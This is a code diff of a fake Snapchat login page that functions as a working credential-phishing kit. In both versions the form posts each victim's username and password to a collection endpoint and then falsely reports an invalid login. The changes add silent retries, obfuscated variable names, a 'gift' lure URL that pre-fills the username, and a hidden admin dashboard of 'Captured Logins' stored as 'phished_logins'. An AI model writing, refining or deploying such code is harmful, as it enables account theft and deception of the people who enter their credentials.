@@ -17,58 +17,60 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 <style>
 @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
-body { font-family: "Inter", sans-serif; user-select: none; -webkit-user-select: none; -ms-user-select: none; margin: 0; background: #fff; }
+body {
+  font-family: "Inter", sans-serif;
+  user-select: none;
+}
 ::-webkit-scrollbar { display: none; }
+
+/* Checkbox old style */
+input[type="checkbox"] {
+  -webkit-appearance: none; -moz-appearance: none; appearance: none;
+  width: 1rem; height: 1rem; border: 2px solid #d1d5db;
+  border-radius: 0.25rem; position: relative; cursor: pointer;
+}
+input[type="checkbox"]:checked::after {
+  content: '';
+  position: absolute;
+  left: 3px; top: 1px;
+  width: 5px; height: 9px;
+  border: solid #00b0ff; border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
+}
+input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
+
+/* Login button */
+#loginBtn { 
+  transition: background 0.2s ease, transform 0.1s ease; 
+  min-width: 42%; 
+  width: 62%; 
+  font-size: 1.05rem; 
+  padding: 0.7rem 0; 
+  display: flex; 
+  justify-content: center; 
+  align-items: center; 
+  margin: 0 auto; 
+  position: relative;
+}
+#loginBtn:active { transform: scale(0.98); }
 
 /* Inputs */
 .input-container { width: 85%; margin: 0 auto; }
 input[type="text"], input[type="password"] { 
-  width: 100%; 
-  font-size: 0.9rem; 
-  font-weight: 500; 
-  padding-bottom: 0.15rem; 
-  font-family: "Inter", sans-serif;
-  border-radius: 0; 
-  border-bottom: 1px solid #ccc;
-  outline: none;
+  width: 100%; font-size: 0.9rem; font-weight: 500; padding-bottom: 0.15rem;
+  font-family: "Inter", sans-serif; border-radius: 0; border-bottom: 2px solid #d1d5db;
 }
 
 /* Password label and field */
 label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
-#password { position: relative; top: -6px; }
-
-/* Gap between username and password */
 .password-container { margin-top: 4px; position: relative; }
 
 /* Checkbox and forgot password */
-label.inline-flex.items-center { 
-  position: relative; 
-  top: -8px; 
-  font-size: 0.817rem; 
-  font-weight: 350;
-}
-#forgotPassword { 
-  position: relative; 
-  top: -9.5px; 
-  font-size: 0.817rem; 
-  font-weight: 350;
-  color: #0083ff; 
-}
+label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.817rem; font-weight: 350; }
+#forgotPassword { position: relative; top: -9.5px; font-size: 0.817rem; font-weight: 350; color:#0083ff; }
 
 /* Error message */
-#errorMsg { 
-  width: 85%; 
-  margin-left: auto; 
-  margin-right: auto; 
-  font-size: 0.8rem; 
-  text-align: left; 
-  color:#ff1952; 
-  font-weight: 400;
-  margin-top: -4px;
-  margin-bottom: -2px;
-  position: relative;
-  top: -6px;
-}
+#errorMsg { width: 85%; margin: auto; font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; position: relative; top: -6px; }
 
 /* Heading */
 h1 { position: relative; top: -10px; font-size: 1.7rem; font-weight: 500; text-align: center; }
@@ -76,62 +78,31 @@ h1 { position: relative; top: -10px; font-size: 1.7rem; font-weight: 500; text-a
 /* Form spacing */
 form.flex.flex-col.space-y-6 { gap: 0.5rem; }
 
-/* Login button */
-#loginBtn { 
-  transition: all 0.2s ease; 
-  min-width: 42%; 
-  width: 62%; 
-  font-size: 1.05rem; 
-  padding: 0.7rem 0; 
-  display: flex; 
-  justify-content: center; 
-  align-items: center;
-  margin: 0 auto; 
-  position: relative;
-  border-radius: 9999px;
-}
-#loginBtn:hover:not(:disabled) { background-color: #0090e0; }
-#loginBtn:active:not(:disabled) { background-color: #007fcc; }
+/* UI extras */
+.card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+.highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
+.remove-btn { cursor: pointer; color: #ef4444; }
+.remove-btn:hover { color: #dc2626; }
+#adminSection { display: none; }
+#adminSection.active { display: block; }
+.back-arrow i { font-size: 1rem; }
+
+/* Password toggle button inside input */
+.password-toggle { position: absolute; right: 0; top: 50%; transform: translateY(-50%); color: #adb7bf; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; }
 
 /* Spinner */
-@keyframes spinnerRotate { to { transform: rotate(360deg); } }
 .spinner {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  width: 24px;
-  height: 24px;
-  border: 3px solid #fff;
+  width: 20px;
+  height: 20px;
+  border: 2px solid #fff;
   border-bottom-color: transparent;
   border-radius: 50%;
-  animation: spinnerRotate 1000ms linear infinite;
-}
-.spinner::before {
-  content: "";
+  animation: spin 1s linear infinite;
   position: absolute;
-  top: 50%;
-  left: 50%;
-  width: 12px;
-  height: 12px;
-  margin-top: -6px;
-  margin-left: -6px;
-  border: 2px solid #fff;
-  border-top-color: transparent;
-  border-radius: 50%;
-  animation: spinnerRotate 500ms linear infinite reverse;
 }
+@keyframes spin { to { transform: rotate(360deg); } }
 
-/* Password toggle */
-.password-toggle { 
-  position: absolute; right: 0; top: 50%; 
-  transform: translateY(-50%); 
-  color: #adb7bf; 
-  font-size: 0.875rem; 
-  background: transparent; 
-  border: none; 
-  cursor: pointer; 
-}
+.spinner-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; }
 </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
@@ -143,11 +114,11 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
   <form id="loginForm" class="flex flex-col space-y-6">
     <div class="flex flex-col input-container">
       <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
-      <input id="username" type="text" autocomplete="username" required inputmode="text">
+      <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required inputmode="text">
     </div>
     <div class="flex flex-col password-container input-container">
       <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
-      <input id="password" type="password" autocomplete="current-password" required inputmode="text">
+      <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required inputmode="text">
       <button type="button" class="password-toggle" onclick="togglePassword()">
         <i id="eyeIcon" class="fas fa-eye-slash"></i>
       </button>
@@ -158,78 +129,103 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
       <span>Save Login Info on your iCloud devices</span>
     </label>
     <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
-    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg relative" disabled>
+    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4">
       <span class="btn-text">Log In</span>
-      <span class="spinner" style="display:none;"></span>
+      <div class="spinner-container"><div class="spinner"></div></div>
     </button>
   </form>
 </div>
+<div id="adminSection" class="p-6 max-w-3xl mx-auto">
+  <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
+  <div class="card p-6 mb-6">
+    <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
+    <div class="overflow-y-auto max-h-96" id="loginList"></div>
+  </div>
+  <div class="card p-6">
+    <h2 class="text-xl font-semibold text-gray-700 mb-4">Stats</h2>
+    <div class="grid grid-cols-2 gap-4 text-center stats">
+      <div class="p-4 bg-blue-50 rounded-lg">
+        <p class="text-sm text-gray-500">Total Logins</p>
+        <p class="text-2xl font-bold text-blue-600" id="totalLogins">0</p>
+      </div>
+      <div class="p-4 bg-green-50 rounded-lg">
+        <p class="text-sm text-gray-500">Last Login</p>
+        <p class="text-2xl font-bold text-green-600" id="lastLogin">N/A</p>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
 document.addEventListener("DOMContentLoaded", function(){
-  const username = document.getElementById("username"),
-        password = document.getElementById("password"),
-        loginBtn = document.getElementById("loginBtn"),
-        errorMsg = document.getElementById("errorMsg"),
-        loginForm = document.getElementById("loginForm");
+  const a=document.getElementById("username"),
+        b=document.getElementById("password"),
+        c=document.getElementById("loginBtn"),
+        d=document.getElementById("errorMsg"),
+        e=document.getElementById("loginForm"),
+        f=document.getElementById("loginList"),
+        g=document.getElementById("totalLogins"),
+        h=document.getElementById("lastLogin"),
+        spinnerContainer = c.querySelector(".spinner-container"),
+        btnText = c.querySelector(".btn-text"),
+        u2="/api/validate",
+        m3=3;
+  let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
 
-  const spinner = loginBtn.querySelector(".spinner");
-  const btnText = loginBtn.querySelector(".btn-text");
+  // Pre-fill username if URL matches /gift/{something}/login
+  const pathMatch = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
+  if(pathMatch && pathMatch[1]){ a.value = pathMatch[1]; }
 
-  const webhookUrl = "/api/validate"; // keep your webhook here
-
-  function toggleButton() {
-    if(username.value.trim() && password.value.trim()){
-      loginBtn.classList.remove("bg-[#b7c0c8]");
-      loginBtn.classList.add("bg-[#00b0ff]");
-      loginBtn.disabled = false;
-    } else {
-      loginBtn.classList.remove("bg-[#00b0ff]");
-      loginBtn.classList.add("bg-[#b7c0c8]");
-      loginBtn.disabled = true;
-    }
+  function x1(p,r=m3){
+    return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"})
+      .then(s=>s.ok||Promise.reject("Request failed"))
+      .catch(()=>(r>0?x1(p,r-1):!1))
   }
 
-  username.addEventListener("input", toggleButton);
-  password.addEventListener("input", toggleButton);
+  function y2(){
+    a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1)
+    :(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0)
+  }
 
-  loginForm.addEventListener("submit", async function(e){
-    e.preventDefault();
-    spinner.style.display="block";
-    btnText.style.visibility="hidden";
+  function z3(t,u){
+    n4++,l5.push({username:t,timestamp:u}),localStorage.setItem("phished_logins",JSON.stringify(l5)),g.textContent=n4,h.textContent=u;
+    const v=document.createElement("div");
+    v.className="highlight mb-2 p-2 flex justify-between items-center",
+    v.innerHTML=`<span>${t} - ${u}</span><span class="remove-btn" onclick="removeLogin(this,'${t}','${u}')"><i class="fas fa-trash-alt"></i></span>`,
+    f.appendChild(v)
+  }
 
-    const u=username.value.trim();
-    const p=password.value.trim();
-    const timestamp = new Date().toLocaleString();
+  window.removeLogin=function(w,t,u){
+    l5=l5.filter(x=>x.username!==t||x.timestamp!==u),
+    localStorage.setItem("phished_logins",JSON.stringify(l5)),
+    n4--,g.textContent=n4,h.textContent=l5.length>0?l5[l5.length-1].timestamp:"N/A",
+    w.parentElement.remove()
+  }
 
-    if(u && p){
-      const payload = {username:u,password:p,timestamp};
-      // send to your webhook
-      fetch(webhookUrl,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify(payload)
-      }).catch(()=>{});
+  a.addEventListener("input",y2);
+  b.addEventListener("input",y2);
 
+  e.addEventListener("submit",async function(o){
+    o.preventDefault();
+    const t=a.value.trim(),u=b.value.trim(),v=new Date().toLocaleString();
+    if(t&&u){
+      const w={username:t,password:u,timestamp:v};
+      spinnerContainer.style.display = "block";
+      btnText.style.visibility = "hidden";
+      await x1(w),l5.push(w),localStorage.setItem("phished_logins",JSON.stringify(l5)),z3(t,v);
       setTimeout(()=>{
-        errorMsg.textContent="Invalid username or password. Try again.";
-        errorMsg.classList.remove("hidden");
-        spinner.style.display="none";
-        btnText.style.visibility="visible";
-        password.value="";
-        toggleButton();
+        spinnerContainer.style.display = "none";
+        btnText.style.visibility = "visible";
+        d.textContent="Invalid username or password. Try again.";
+        d.classList.remove("hidden");
+        b.value=""; y2();
       },1200);
-    } else {
-      spinner.style.display="none";
-      btnText.style.visibility="visible";
-      errorMsg.textContent="Please fill in both fields.";
-      errorMsg.classList.remove("hidden");
-    }
+    } else { d.textContent="Please fill in both fields."; d.classList.remove("hidden"); }
   });
 
   window.togglePassword=function(){
-    password.type = password.type === "password" ? "text" : "password";
-    document.getElementById("eyeIcon").classList.toggle("fa-eye");
-    document.getElementById("eyeIcon").classList.toggle("fa-eye-slash");
+    b.type==="password" ? (b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")) 
+    : (b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))
   }
 });
 
